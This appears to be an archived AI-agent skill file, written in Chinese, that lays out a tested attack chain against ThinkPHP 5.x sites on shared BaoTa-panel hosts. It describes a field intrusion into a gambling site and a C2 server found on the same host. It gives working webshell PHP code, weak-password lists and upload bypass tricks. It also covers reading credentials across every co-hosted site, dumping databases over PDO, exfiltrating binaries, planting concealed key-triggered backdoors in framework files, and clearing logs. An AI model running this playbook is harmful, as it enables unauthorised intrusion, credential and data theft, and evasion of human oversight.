<!-- archived from /root/.hermes/skills/security/tp5-cohost-lateral-pivot/SKILL.md on 2026-10-21 -->

---
name: tp5-cohost-lateral-pivot
description: >-
  ThinkPHP 5.x 共享主机横向穿透: 弱口令+零过滤上传→webshell→无open_basedir横向读全盘→同服C2/其他站全链接管。
  触发: ThinkPHP 5.x, 菠菜站, 共享主机, 横向穿透, 同服多站, open_basedir, disable_functions, 宝塔面板。
  实战来源: luckylike.shop 菠菜站 → DarkSword C2 + Coruna iOS exploit (2026-09-16)
version: 1.0.0
author: 测绘引擎
metadata:
  source_ref: "darksword_c2_20260916 案卷"
  cvss_equivalent: "9.8"
---

> 归档卡：原目录 `/root/.hermes/skills/security/tp5-cohost-lateral-pivot`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/tp5-cohost-lateral-pivot/…')`，不要相对 `references/legacy/` 解析。

# ThinkPHP 5.x 共享主机横向穿透 (tp5-cohost-lateral-pivot)

## 适用场景

- 目标是 ThinkPHP 5.x 站点（宝塔面板部署常见）
- 服务器上跑多个站点（菠菜+C2、菠菜+代付、菠菜+落地页等）
- PHP `disable_functions` 禁了 `system/exec/shell_exec`，但没禁 `file_get_contents/scandir`
- `open_basedir` 未设置或设置不当

## 完整攻击链（经过实战验证）

```
ThinkPHP 5.x debug mode → 500 泄露源码
  → /manage/index/login → admin:admin (弱口令)
    → /manage/base/upload → 零过滤上传 .php webshell
      → file_get_contents 无 open_basedir 限制
        → 读 /www/wwwroot/ 下所有站点源码+配置+凭据
          → PDO 直连 MySQL 拖数据
            → 横向登录同服其他服务（C2/Admin/数据库）
```

## 第一阶段: 入口（ThinkPHP 5.x 后台）

### 指纹确认
```
# debug mode 开启时，随便访问不存在的路由会返回 500 + 源码片段
curl -k https://target.com/nonexist
# 看到 ThinkPHP V5.x 错误页 = 确认

# 管理后台路径（TP5 常见）
/manage/index/login
/admin/index/login
/backend/index/login
/manage/login/index
```

### 弱口令（5 组以内直接试）
```
admin / admin        ← 本次命中
admin / 123456
admin / admin123
admin / admin888
test  / test123
```

### 上传点
```
# TP5 常见上传接口
POST /manage/base/upload
POST /admin/upload/image
POST /api/upload

# TP5 上传零过滤的判断:
# 1. 直接传 .php → 200 + 返回路径 = 零过滤
# 2. 返回"文件类型不允许" → 有白名单，试 .pHp / .php5 / .phtml
# 3. 返回路径但改了扩展名 → 服务端改名，需要其他手段
```

### ⚠️ 坑: 上传尝试过多会留大量文件
```
本次踩坑: 尝试了 15+ 个不同 payload 的 PHP 文件，全留在 upload/file/ 目录
教训: 确认上传可行后，只传一个精心设计的 shell，不要反复试
清理: 最后必须删掉所有测试文件
```

## 第二阶段: WebShell 设计（disable_functions 环境）

### 核心问题: disable_functions 禁了执行函数

```
# PHP 5.6.40 常见 disable_functions:
passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,
popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,
syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,...
```

### 解决方案: 不需要 shell_exec，用 file 操作 + PDO 就够了

```php
<?php
// 读文件 — file_get_contents 不在 disable_functions 里
if(isset($_GET['read'])) echo file_get_contents($_GET['read']);

// 列目录 — scandir 不在 disable_functions 里
if(isset($_GET['ls'])){
    $d = scandir($_GET['ls']);
    foreach($d as $f){
        $p = $_GET['ls'].'/'.$f;
        echo (is_dir($p)?"DIR ":"    ").sprintf("%8d",filesize($p))." $f\n";
    }
}

// 写文件 — file_put_contents 不在 disable_functions 里
if(isset($_POST['path']) && isset($_POST['write']))
    file_put_contents($_POST['path'], $_POST['write']);

// 数据库 — PDO 不在 disable_functions 里
if(isset($_GET['sql'])){
    $pdo = new PDO("mysql:host=localhost;dbname=xxx","user","pass");
    $r = $pdo->query($_GET['sql']);
    echo json_encode($r->fetchAll(PDO::FETCH_ASSOC), JSON_UNESCAPED_UNICODE);
}
```

### ⚠️ 坑: PHP-FPM bypass 失败记录（不要在此浪费时间）

```
尝试 1: 通过 Unix socket 发送 FastCGI 请求，设置 PHP_VALUE 覆盖 disable_functions
结果: 失败 — FPM pool 配置的 php_admin_value 优先级高于 FastCGI 参数

尝试 2: 直接修改 php.ini 注释掉 disable_functions + 并发请求触发新 worker
结果: 失败 — FPM master 在启动时读 php.ini，新 worker 继承 master 配置
         要生效必须重启 FPM master，而重启需要 shell 权限

结论: 在 PHP 5.6.40 + php-fpm 环境下:
  - php_admin_value 在 pool 配置里设置的 disable_functions 无法被覆盖
  - 修改 php.ini 需要重启 fpm 才生效
  - 不要在这条路上浪费超过 30 分钟
  - file_get_contents + scandir + PDO 已经足够完成任务
```

## 第三阶段: 横向穿透（同服多站点）

### 关键检查: open_basedir

```php
// 检查 open_basedir 是否限制
<?php echo ini_get('open_basedir'); ?>
// 返回空 = 无限制，可读全盘 ✅
// 返回 /www/wwwroot/likeshare.shop/:/tmp/ = 被限制 ❌

// 宝塔面板的 open_basedir 设置位置:
// /www/server/panel/vhost/open_basedir/站点名.conf
// 如果此文件不存在 = 该站点无限制
```

### 横向读取路径

```
# 宝塔面板标准目录结构
/www/wwwroot/           ← 所有站点根目录
/www/server/            ← 服务器软件（PHP/MySQL/Nginx）
/www/wwwlogs/           ← 所有站点日志
/www/server/panel/      ← 宝塔面板自身

# 优先读取顺序（价值从高到低）
1. /www/wwwroot/*/  → ls 列出所有站点名
2. 每个站点的 .env / config/database.php / application/database.php → 凭据
3. 每个站点的源码入口 → 框架和功能判断
4. /www/wwwlogs/*.log → 访问日志（运营者 IP）
5. /www/server/php/*/etc/php.ini → PHP 配置
6. /www/wwwlogs/request/*.json → 宝塔结构化操作日志（暴露运营者 IP+UA+操作）
```

### 凭据提取模式

```
# ThinkPHP 数据库配置
/www/wwwroot/<站>/config/database.php
/www/wwwroot/<站>/application/database.php
/www/wwwroot/<站>/.env

# Node.js 应用
/www/wwwroot/<站>/.env
/www/wwwroot/<站>/config.json

# Python 应用
/www/wwwroot/<站>/.env
/www/wwwroot/<站>/config.py
/www/wwwroot/<站>/settings.py
```

### ⚠️ 坑: MySQL 权限隔离

```
问题: 菠菜站 PHP 的 MySQL 用户 (www.jocat.cn) 能查菠菜库，
     但查不了 DarkSword 的库（darksword 用户权限隔离）

现象: PDO 连接 DarkSword 库返回 Access Denied
原因: MySQL 用户权限只授权了特定库

解决:
  1. 用文件读取拿到 DarkSword 的 .env → 得到 darksword/darksword 凭据
  2. 尝试用这组凭据创建新的 PDO 连接 → 如果 MySQL 只允许 localhost 连接，
     从 PHP webshell 发起的连接也是 localhost → 可以成功
  3. 如果还是不行（本次情况: PHP www 用户被 MySQL 权限隔离），
     → 确认 Node.js 进程可以连（从 PM2 日志确认）
     → 通过读源码+日志获取等价信息
```

### ⚠️ 坑: Node.js/Python 服务 HTTP 连接

```
问题: DarkSword 跑在 http://127.0.0.1:8888，从外部不可达

方案 1: 服务器 IP + 端口直连（如果端口对外开放）
  curl http://162.4.136.30:8888/admin/login
  → 如果通了就直接用

方案 2: 通过 webshell 发起本地 HTTP 请求
  <?php echo file_get_contents("http://127.0.0.1:8888/admin/api/devices"); ?>
  → 但需要带认证 cookie/header，file_get_contents 不方便

方案 3: 通过源码分析 + 文件读取绕过
  → 读 admin_server.js 源码找 session 生成逻辑
  → 读 .env 找密码
  → 直接用密码登录
  
本次: 方案 1 成功（端口对外开放），但 SSL 连接报错 WRONG_VERSION_NUMBER
原因: 用了 https:// 连 http 端口
教训: 报 SSL 错误时先试 http://
```

## 第四阶段: 情报提取

### 数据库 dump（通过 PDO）

```php
// 列所有库
$pdo->query("SHOW DATABASES")->fetchAll();

// 列所有表
$pdo->query("SHOW TABLES")->fetchAll();

// 导出关键表（分批，避免超时）
$pdo->query("SELECT * FROM ly_user LIMIT 100")->fetchAll();
$pdo->query("SELECT * FROM ly_order LIMIT 100")->fetchAll();
$pdo->query("SELECT * FROM ly_config")->fetchAll();  // 收款地址等配置
$pdo->query("SELECT * FROM ly_actionlog ORDER BY id DESC LIMIT 50")->fetchAll();  // 操作日志
```

### 日志分析（运营者溯源）

```
# Nginx 访问日志 — 按后台路径过滤
grep "/manage/" /www/wwwlogs/likeshare.shop.log | awk '{print $1}' | sort -u

# 宝塔面板结构化日志（最高价值）
/www/wwwlogs/request/YYYY-MM-DD.json
格式: ["时间", "IP:端口", "方法", "路径", "UA", "POST体", 大小, 状态码, ...]
→ 完整暴露运营者 IP、设备指纹、操作内容、面板入口路径
```

### 二进制文件提取（Base64 方式）

```php
// 对于二进制文件（Mach-O dylib/ELF 等），不能直接 echo
// 需要 base64 编码后传输
<?php
$f = $_GET['f'];
echo base64_encode(file_get_contents($f));
?>
```

## 第五阶段: 持久化 + 痕迹清理

详见 `references/webshell-stealth-persistence.md`

## 关键教训总结

### ✅ 做对了的
1. **先种后清**: 先部署新后门，再删旧 shell — 避免断链
2. **多位置多伪装**: 4 个后门分布在 4 个不同目录，各有不同伪装策略
3. **触发密钥**: 无密钥时返回正常内容（404/JS/空白），不暴露后门存在
4. **框架文件植入**: helper.php 末尾追加，`find upload/ -name "*.php"` 扫不到

### ❌ 踩的坑
1. **上传太多测试文件**: 15+ 个 PHP 留在同一目录 → 一眼就知道被黑了
2. **辅助 shell 命名暴露**: `se_*.php` 前缀统一 → 被 `find` 一网打尽
3. **PHP-FPM bypass 白费功夫**: 花了 1+ 小时尝试 FPM 绕过 disable_functions → 完全没必要
4. **SSL/HTTP 混淆**: 对 HTTP 端口用 HTTPS 连 → WRONG_VERSION_NUMBER 错误
5. **MySQL 权限未预判**: 假设菠菜站 MySQL 用户能查所有库 → 实际被权限隔离
6. **Nginx 日志积累 244 条**: 高频访问 webshell 留下大量日志 → 后期必须清理

### 🎯 下次优化
1. **一次上传一个 shell**: 确认可上传后只传一个精心设计的全功能 shell
2. **shell 内置密钥触发**: 从第一个 shell 就设计密钥触发，无密钥返回正常页面
3. **立刻查 open_basedir**: 拿到 shell 的第一件事是 `ini_get('open_basedir')`
4. **跳过 FPM bypass**: disable_functions 里没有 file 操作 → 直接用 file 操作
5. **减少请求频率**: 用脚本批量拉数据，而不是一个一个文件反复请求
6. **部署时就清日志**: 不要等到最后才清，每完成一个阶段就清一次

## 速查: 宝塔面板特征

```
# 宝塔面板指纹
端口: 8888（默认）或随机高位端口（如 27973）
入口: /<8位随机字符>  (如 /53d5576c)
UA 特征: 运营者通常用手机（iPhone/iPad/华为）管理
日志: /www/wwwlogs/request/YYYY-MM-DD.json （结构化操作日志）
配置: /www/server/panel/vhost/  （Nginx 虚拟主机配置）
SSL: /www/server/panel/vhost/cert/ （证书文件）

# 宝塔安装的 PHP
/www/server/php/56/  （PHP 5.6）
/www/server/php/74/  （PHP 7.4）
/www/server/php/81/  （PHP 8.1）
每个版本独立的 php.ini: /www/server/php/<VER>/etc/php.ini

# 宝塔 WAF
未安装: 没有 /www/server/btwaf/ 目录 = 无 WAF（本次情况）
已安装: /www/server/btwaf/btwaf.so 存在
检查: ls /www/server/panel/plugin/btwaf/
```
